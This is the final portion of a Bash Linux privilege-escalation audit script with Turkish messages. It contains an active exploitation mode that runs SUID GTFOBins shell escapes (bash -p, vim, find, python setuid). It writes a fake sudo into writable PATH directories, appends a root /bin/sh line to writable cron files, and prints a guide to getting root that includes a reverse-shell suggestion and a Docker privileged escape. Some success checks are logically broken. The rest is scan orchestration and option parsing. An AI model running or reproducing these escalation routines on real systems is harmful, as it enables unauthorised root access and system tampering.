    echo -e "\e[00;31m╚══════════════════════════════════════════════════════════════╝\e[00m"
    
    echo ""
    echo -e "\e[00;31mDevam etmek istiyor musunuz? (TAMAM yazın): \e[00m"
    read -r confirmation
    
    if [[ "$confirmation" != "TAMAM" ]]; then
        echo -e "\e[00;32mYetki yukselmesi denemesi iptal edildi.\e[00m"
        return 1
    fi
    
    echo -e "\e[00;31mGTFOBins tabanli yetki yukselmesi denemeleri baslatiliyor...\e[00m"
    
    # Sistem bilgilerini al
    current_user=$(whoami)
    current_uid=$(id -u)
    
    echo -e "\e[00;33mMevcut kullanıcı: $current_user (UID: $current_uid)\e[00m"
    
    if [ "$current_uid" -eq 0 ]; then
        echo -e "\e[00;32mZaten root yetkisine sahipsiniz!\e[00m"
        return 0
    fi
    
    # GTFOBins tarzı basit exploit denemeleri
    attempted_exploits=0
    successful_exploits=0
    
    # 1. SUID binary kontrolü ve deneme
    echo -e "\e[00;33mSUID binary'ler ile yetki yukselmesi deneniyor...\e[00m"
    suid_binaries=$(find / -perm -4000 -type f 2>/dev/null | head -10)
    
    for suid_binary in $suid_binaries; do
        binary_name=$(basename "$suid_binary")
        echo -e "\e[00;32m   → $binary_name deneniyor...\e[00m"
        
        # Basit GTFOBins denemeleri
        case "$binary_name" in
            "bash"|"sh")
                # Timeout ile çalıştır
                timeout 5s "$suid_binary" -p -c "id" 2>/dev/null | grep -q "uid=0" && {
                    echo -e "\e[00;32mBASARILI! $binary_name ile root yetkisi elde edildi!\e[00m"
                    echo -e "\e[00;31mRoot shell aciliyor... (cikmak icin 'exit' yazin)\e[00m"
                    
                    # Root shell aç
                    export PS1='\[\e[1;31m\][ROOT] \u@\h:\w\$ \[\e[0m\]'
                    "$suid_binary" -p
                    
                    echo -e "\e[00;32mRoot shell kapatıldı. Ana programa dönülüyor...\e[00m"
                    successful_exploits=$((successful_exploits + 1))
                    break
                } || echo -e "\e[00;31m   → Başarısız: $binary_name ile root olunamadı\e[00m"
                ;;
            "vim"|"vi")
                # Vim ile shell açma denemesi
                echo -e ":!/bin/sh -p\n:quit" | timeout 5s "$suid_binary" - 2>/dev/null || true
                ;;
            "find")
                # Find ile shell çalıştırma
                timeout 5s "$suid_binary" / -exec /bin/sh -p \; -quit 2>/dev/null || true
                ;;
            "python"|"python2"|"python3")
                # Python ile yetki yükseltmesi
                echo "import os; os.setuid(0); os.system('/bin/sh -p')" | timeout 5s "$suid_binary" 2>/dev/null || true
                ;;
        esac
        
        attempted_exploits=$((attempted_exploits + 1))
        
        # Güvenlik için maksimum 5 deneme
        if [ $attempted_exploits -ge 5 ]; then
            echo -e "\e[00;33mGüvenlik için maksimum deneme sayisina ulasildi.\e[00m"
            break
        fi
    done
    
    # 2. Path hijacking denemesi
    if [ $successful_exploits -eq 0 ]; then
        echo -e "\e[00;33mPATH hijacking deneniyor...\e[00m"
        
        # PATH'te yazılabilir dizin var mı kontrol et
        IFS=':' read -ra PATH_DIRS <<< "$PATH"
        for dir in "${PATH_DIRS[@]}"; do
            if [ -n "$dir" ] && [ -d "$dir" ] && [ -w "$dir" ]; then
                echo -e "\e[00;32m   → Yazılabilir PATH dizini bulundu: $dir\e[00m"
                
                # Sahte sudo komutu oluştur
                cat > "$dir/sudo" << 'EOF'
#!/bin/bash
/bin/sh -p
EOF
                chmod +x "$dir/sudo"
                
                # Test et
                if [ "$(id -u)" -eq 0 ]; then
                    echo -e "\e[00;32mBASARILI! PATH hijacking ile root yetkisi elde edildi!\e[00m"
                    echo -e "\e[00;31mRoot shell aciliyor...\e[00m"
                    
                    export PS1='\[\e[1;31m\][ROOT] \u@\h:\w\$ \[\e[0m\]'
                    /bin/sh -p
                    
                    echo -e "\e[00;32mRoot shell kapatıldı.\e[00m"
                    successful_exploits=$((successful_exploits + 1))
                    
                    # Temizlik
                    rm -f "$dir/sudo"
                    break
                else
                    # Temizlik
                    rm -f "$dir/sudo"
                    echo -e "\e[00;31m   → PATH hijacking başarısız\e[00m"
                fi
            fi
        done
    fi
    
    # 3. Cron job exploit denemesi
    if [ $successful_exploits -eq 0 ]; then
        echo -e "\e[00;33mCron job exploit deneniyor...\e[00m"
        
        # Yazılabilir cron dosyası var mı
        writable_cron=$(find /etc/cron* -writable -type f 2>/dev/null | head -1)
        if [ -n "$writable_cron" ]; then
            echo -e "\e[00;32m   → Yazılabilir cron dosyası bulundu: $writable_cron\e[00m"
            
            # Cron job ekle
            echo "* * * * * root /bin/sh -p" >> "$writable_cron"
            
            # 1 dakika bekle ve kontrol et
            echo -e "\e[00;33m   → Cron job eklendi, 10 saniye bekleniyor...\e[00m"
            sleep 10
            
            if [ "$(id -u)" -eq 0 ]; then
                echo -e "\e[00;32mBASARILI! Cron job exploit ile root yetkisi elde edildi!\e[00m"
                echo -e "\e[00;31mRoot shell aciliyor...\e[00m"
                
                export PS1='\[\e[1;31m\][ROOT] \u@\h:\w\$ \[\e[0m\]'
                /bin/sh -p
                
                echo -e "\e[00;32mRoot shell kapatıldı.\e[00m"
                successful_exploits=$((successful_exploits + 1))
            else
                echo -e "\e[00;31m   → Cron job exploit başarısız\e[00m"
            fi
            
            # Cron job'u temizle
            sed -i '/\* \* \* \* \* root \/bin\/sh -p/d' "$writable_cron"
        fi
    fi
    
    if [ $successful_exploits -eq 0 ]; then
        echo -e "\e[00;31mHicbir yetki yukselmesi denemesi basarili olmadi.\e[00m"
        echo -e "\e[00;33mROOT OLMAK ICIN ADIM ADIM REHBER:\e[00m"
        echo ""
        
        # SUID/SGID analizi ve öneriler
        echo -e "\e[00;31m1. SUID/SGID Binary Analizi:\e[00m"
        suid_count=$(find / -perm -4000 -type f 2>/dev/null | wc -l)
        sgid_count=$(find / -perm -2000 -type f 2>/dev/null | wc -l)
        
        if [ $suid_count -gt 0 ]; then
            echo -e "\e[00;33m   → $suid_count adet SUID binary bulundu\e[00m"
            echo -e "\e[00;32m   Öneri: GTFOBins'de şu binary'leri ara:\e[00m"
            find / -perm -4000 -type f 2>/dev/null | head -5 | while read binary; do
                binary_name=$(basename "$binary")
                echo -e "\e[00;32m      • $binary_name: https://gtfobins.github.io/gtfobins/$binary_name/\e[00m"
            done
        fi
        
        if [ $sgid_count -gt 0 ]; then
            echo -e "\e[00;33m   → $sgid_count adet SGID binary bulundu\e[00m"
        fi
        
        # Yazılabilir dosya analizi
        echo ""
        echo -e "\e[00;31m2. Yazılabilir Kritik Dosyalar:\e[00m"
        writable_critical=$(find /etc -writable -type f 2>/dev/null | wc -l)
        if [ $writable_critical -gt 0 ]; then
            echo -e "\e[00;33m   → /etc dizininde $writable_critical adet yazılabilir dosya!\e[00m"
            echo -e "\e[00;32m   Öneri: Bu dosyaları düzenleyerek root yetkisi elde edebilirsiniz\e[00m"
            find /etc -writable -type f 2>/dev/null | head -3 | while read file; do
                echo -e "\e[00;32m      • $file\e[00m"
            done
        fi
        
        # PATH analizi
        echo ""
        echo -e "\e[00;31m3. PATH Güvenlik Açıkları:\e[00m"
        IFS=':' read -ra PATH_DIRS <<< "$PATH"
        writable_paths=0
        for dir in "${PATH_DIRS[@]}"; do
            if [ -n "$dir" ] && [ -d "$dir" ] && [ -w "$dir" ]; then
                writable_paths=$((writable_paths + 1))
            fi
        done
        
        if [ $writable_paths -gt 0 ]; then
            echo -e "\e[00;33m   → PATH'te $writable_paths adet yazılabilir dizin var!\e[00m"
            echo -e "\e[00;32m   Öneri: Sahte binary'ler oluşturarak PATH hijacking yapın\e[00m"
            for dir in "${PATH_DIRS[@]}"; do
                if [ -n "$dir" ] && [ -d "$dir" ] && [ -w "$dir" ]; then
                    echo -e "\e[00;32m      • $dir (örn: cp /bin/sh $dir/sudo)\e[00m"
                fi
            done
        fi
        
        # Cron job analizi
        echo ""
        echo -e "\e[00;31m4. Cron Job Güvenlik Açıkları:\e[00m"
        writable_cron=$(find /etc/cron* -writable -type f 2>/dev/null | wc -l)
        if [ $writable_cron -gt 0 ]; then
            echo -e "\e[00;33m   → $writable_cron adet yazılabilir cron dosyası!\e[00m"
            echo -e "\e[00;32m   Öneri: Cron job'larına reverse shell ekleyin\e[00m"
            find /etc/cron* -writable -type f 2>/dev/null | head -2 | while read cron_file; do
                echo -e "\e[00;32m      • $cron_file (örn: echo '* * * * * root /bin/sh' >> $cron_file)\e[00m"
            done
        fi
        
        # Kernel exploit önerileri
        echo ""
        echo -e "\e[00;31m5. Kernel Exploit Önerileri:\e[00m"
        kernel_version=$(uname -r)
        echo -e "\e[00;33m   → Kernel sürümü: $kernel_version\e[00m"
        echo -e "\e[00;32m   Öneri: Bu kernel sürümü için exploit araştırın:\e[00m"
        echo -e "\e[00;32m      • Searchsploit: searchsploit linux kernel $kernel_version\e[00m"
        echo -e "\e[00;32m      • Exploit-DB: https://www.exploit-db.com/search?type=local&platform=linux\e[00m"
        echo -e "\e[00;32m      • GitHub: https://github.com/search?q=$kernel_version+exploit\e[00m"
        
        # Servis analizi
        echo ""
        echo -e "\e[00;31m6. Servis Güvenlik Açıkları:\e[00m"
        if command_exists systemctl; then
            guvenlik_acigi_olan_servisler=$(systemctl list-units --type=service --state=running 2>/dev/null | grep -E "(apache|nginx|mysql|postgres|ssh)" | wc -l)
            if [ $guvenlik_acigi_olan_servisler -gt 0 ]; then
                echo -e "\e[00;33m   → $guvenlik_acigi_olan_servisler adet potansiyel olarak güvenlik açığı olan servis çalışıyor\e[00m"
                echo -e "\e[00;32m   Öneri: Servis konfigürasyonlarını ve log dosyalarını inceleyin\e[00m"
            fi
        fi
        
        # Container kaçış önerileri
        echo ""
        echo -e "\e[00;31m7. Container Kaçış Teknikleri:\e[00m"
        if [ -f /.dockerenv ] || grep -q docker /proc/1/cgroup 2>/dev/null; then
            echo -e "\e[00;33m   → Docker container içinde çalışıyorsunuz!\e[00m"
            echo -e "\e[00;32m   Öneri: Container kaçış teknikleri deneyin:\e[00m"
            echo -e "\e[00;32m      • docker run --privileged -v /:/host alpine chroot /host\e[00m"
            echo -e "\e[00;32m      • mount | grep proc (proc mount escape)\e[00m"
        fi
        
        # Genel öneriler
        echo ""
        echo -e "\e[00;31mGENEL ROOT OLMA STRATEJILERI:\e[00m"
        echo -e "\e[00;32m   1. GTFOBins: https://gtfobins.github.io/ (En güvenilir yöntem)\e[00m"
        echo -e "\e[00;33m   2. Exploit-DB: https://www.exploit-db.com/ (Kernel exploit'leri)\e[00m"
        echo -e "\e[00;33m   3. Metasploit: msfconsole (Otomatik exploit framework)\e[00m"
        echo -e "\e[00;33m   4. LinPEAS/LinEnum: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite\e[00m"
        echo -e "\e[00;33m   5. PSpy: https://github.com/DominicBreuker/pspy (Process monitoring)\e[00m"
        echo -e "\e[00;32m   6. Manual enumeration: Sistem dosyalarını manuel inceleyin\e[00m"
        
        echo ""
        echo -e "\e[00;31mONEMLI HATIRLATMA:\e[00m"
        echo -e "\e[00;33m   • Sadece kendi sisteminizde veya izin verilen sistemlerde kullanın\e[00m"
        echo -e "\e[00;33m   • Yasal sorumluluk size aittir\e[00m"
        echo -e "\e[00;33m   • Sistemi bozabilecek işlemler yapmayın\e[00m"
        echo -e "\e[00;33m   • Her zaman yedek alın\e[00m"
    fi
    
    echo -e "\e[00;31mYetki yukselmesi deneme modu tamamlandi.\e[00m"
}

# Footer fonksiyonu
footer() {
    local scan_end_time=$(date +%s)
    local total_time=$((scan_end_time - SCAN_START_TIME))
    
    # Risk skorunu 100 ile sınırla
    if [ "$risk_score" -gt 100 ]; then
        risk_score=100
    fi
    
    local risk_percentage=$risk_score
    
    echo ""
    echo -e "${YELLOW}================================================${NC}"
    echo -e "${YELLOW}TARAMA TAMAMLANDI${NC}"
    echo -e "${YELLOW}================================================${NC}"
    echo -e "${CYAN}Başlangıç: $SCAN_START_DATE${NC}"
    echo -e "${CYAN}Bitiş: $(date '+%Y-%m-%d %H:%M:%S')${NC}"
    echo -e "${CYAN}Toplam Süre: ${total_time}s${NC}"
    echo ""
    echo -e "${CYAN}RISK OZETI:${NC}"
    echo -e "  ${RED}KRİTİK: $critical_count${NC}"
    echo -e "  ${RED}Yüksek: $high_count${NC}"
    echo -e "  ${YELLOW}Orta: $medium_count${NC}"
    echo -e "  ${GREEN}Düşük: $low_count${NC}"
    echo -e "  ${MAGENTA}Risk Puanı: $risk_score/100 (%$risk_percentage)${NC}"
    echo ""
    echo -e "${GREEN}Rapor dosyasi: $REPORT_FILE${NC}"
    echo -e "${GREEN}Kaydedilen sonuc: $RESULT_FILE${NC}"
    echo ""
    echo -e "${GREEN}Rapor ekrana yazdırma tamamlandı. Sonuçlar ekranda ve rapor dosyasında hazır.${NC}"
    echo ""
    echo -e "${GREEN}Güvenli günler dilerim!${NC}"
    echo ""
}

# Gelişmiş ana tarama fonksiyonu
advanced_call_each() {
    echo -e "${YELLOW}GELISMIS YETKI YUKSELTME TARAMASI BASLATILIYOR...${NC}"
    echo -e "${CYAN}Baslangic: $SCAN_START_DATE${NC}"
    echo ""

    # Veritabanını başlat
    init_database

    check_root
    # Tüm gelişmiş tarama fonksiyonlarını çağır
    header
    debug_info
    system_info
    user_info
    environmental_info
    
    # Gelişmiş akıllı taramalar
    priv_esc_tools
    privilege_vectors
    linpeas_linenum_extras
    
    # ULTRA DERİN TARAMALAR
    pam_audit
    sudo_deep_audit
    ssh_security_audit
    sysctl_security_audit
    mount_points_audit
    library_injection_audit
    daemon_privileges_audit
    core_dump_audit
    mac_audit
    firewall_audit
    
    # ML VE ENTERPRISE SEVIYE RİSK ANALİZİ (v4.0)
    ml_risk_predictor
    cve_vulnerability_scanner
    behavioral_anomaly_detection
    advanced_encryption_analysis
    supply_chain_risk_assessment
    zero_day_heuristics
    intelligent_remediation_engine
    baseline_system_comparison
    
    # İLERİ SEVIYE TARAMALAR (v3.0+ Extra)
    kernel_modules_audit
    scheduled_tasks_deep_audit
    capabilities_audit
    binary_hardening_audit
    auditd_readiness
    password_policy_advanced
    umask_default_permissions
    
    # Genel güvenlik taramaları
    advanced_vulnerability_scanner
    advanced_suid_scanner
    advanced_service_scanner
    advanced_file_scanner
    advanced_container_scanner
    advanced_credential_scanner
    advanced_package_scanner
    advanced_system_settings
    process_security
    network_security
    
    # Mevcut fonksiyonlar
    job_info
    networking_info
    services_info
    system_hardening_checks
    sudoers_cron_checks
    software_configs
    interesting_files
    
    # Gelişmiş raporlama
    advanced_reporting
    
    # Yeni akıllı özellikler
    if [ "$generate_fix" = "1" ]; then
        generate_fix_script
    fi
    
    if [ "$html_report" = "1" ]; then
        generate_html_report
    fi
    
    if [ "$use_database" = "1" ]; then
        save_to_database
        compare_with_history
    fi
    
    footer
}

# Hatalı call_each fonksiyonunu düzelt
call_each() {
    advanced_call_each
}

# Eksikse etkileşimli menü için basit yedek
interactive_menu() {
  advanced_call_each
}

# Ana program
if [ $# -eq 0 ]; then
  interactive_menu
else
  while getopts "hvqjmftk:e:pr:r:-:" opt; do
    case $opt in
      h)
        usage
        exit 0
        ;;
      v)
        quiet=""
        ;;
      q)
        quiet="1"
        ;;
      j)
        output_format="json"
        ;;
      m)
        output_format="md"
        ;;
      f)
        fast_mode="1"
        FIND_TIMEOUT=5
        ;;
      t)
        thorough="1"
        FIND_TIMEOUT=60
        ;;
      k)
        keyword="$OPTARG"
        ;;
      e)
        export="$OPTARG"
        mkdir -p "$export" 2>/dev/null
        ;;
      p)
        sudopass="1"
        ;;
      r)
        report="$OPTARG"
        ;;
      -)
        case "${OPTARG}" in
          help)
            usage
            exit 0
            ;;
          version)
            echo "Versiyon: $version"
            exit 0
            ;;
      --no-colors)
            disable_colors
            use_colors=""
            ;;
          fix-script)
            generate_fix="1"
            ;;
          html-report)
            html_report="1"
            ;;
          database)
            use_database="1"
            ;;
          *)
            echo "Bilinmeyen seçenek: --${OPTARG}"
            usage
            exit 1
            ;;
        esac
        ;;
      *)
        echo "Geçersiz seçenek: -$OPTARG"
        usage
        exit 1
        ;;
    esac
  done

  advanced_call_each
fi
